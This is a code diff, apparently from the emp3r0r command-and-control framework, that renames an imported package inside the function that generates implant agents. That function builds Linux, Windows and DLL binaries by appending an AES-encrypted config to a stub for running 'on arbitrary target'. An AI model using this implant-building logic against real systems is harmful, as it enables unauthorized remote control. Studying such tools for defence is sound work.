@@ -12,7 +12,7 @@ import (
 	"strings"
 	"time"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -74,7 +74,7 @@ func modGenAgent() {
 			return
 		}
 		CliPrintInfo("Generating agent for %s platform", arch_choice)
-		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Linux, arch_choice)
+		stubFile = fmt.Sprintf("%s-%s", emp3r0r_def.Stub_Linux, arch_choice)
 		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
@@ -84,13 +84,13 @@ func modGenAgent() {
 			CliPrintError("Invalid arch choice")
 			return
 		}
-		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Windows, arch_choice)
+		stubFile = fmt.Sprintf("%s-%s", emp3r0r_def.Stub_Windows, arch_choice)
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case "dll":
 		CliPrintInfo("You chose Windows DLL")
-		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Windows_DLL, arch_choice)
+		stubFile = fmt.Sprintf("%s-%s", emp3r0r_def.Stub_Windows_DLL, arch_choice)
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
@@ -121,7 +121,7 @@ func modGenAgent() {
 	}
 
 	// encrypt
-	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_data.OneTimeMagicBytes, jsonBytes)
+	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_def.OneTimeMagicBytes, jsonBytes)
 	if err != nil {
 		CliPrintError("Failed to encrypt %s: %v", EmpConfigFile, err)
 		return
@@ -133,7 +133,7 @@ func modGenAgent() {
 		CliPrintError("Read stub: %v", err)
 		return
 	}
-	sep := bytes.Repeat(emp3r0r_data.OneTimeMagicBytes, 2)
+	sep := bytes.Repeat(emp3r0r_def.OneTimeMagicBytes, 2)
 
 	// payload
 	config_payload := append(sep, encryptedJSONBytes...)
@@ -158,7 +158,7 @@ func modGenAgent() {
 	// done
 	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
 		outfile, stubFile, EmpConfigFile, outfile)
-	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_data.OneTimeMagicBytes)
+	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_def.OneTimeMagicBytes)
 	agent_binary_path = outfile
 
 	packed_file := fmt.Sprintf("%s.packed", outfile)
